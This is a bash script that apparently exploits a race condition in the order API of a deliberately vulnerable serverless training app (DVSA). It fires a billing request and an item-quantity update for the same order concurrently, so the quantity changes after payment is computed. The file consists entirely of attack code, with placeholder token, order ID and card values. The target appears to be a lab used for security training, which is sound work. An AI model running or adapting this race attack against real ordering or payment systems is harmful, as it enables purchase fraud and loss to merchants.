#!/bin/bash
API="https://p2x3oihjo8.execute-api.us-east-1.amazonaws.com/dvsa/order"
TOKEN="TOKEN"
ORDER_ID="ORDER_ID"

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d "{\"action\":\"billing\",\"order-id\":\"$ORDER_ID\",\"data\":{\"ccn\":\"xxxxxxxxxxxxxxxx\",\"exp\":\"xy/xy\",\"cvv\":\"xxx\"}}" &

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d "{\"action\":\"update\",\"order-id\":\"$ORDER_ID\",\"items\":{\"XXXX\":5}}" &

wait
echo "DONE"
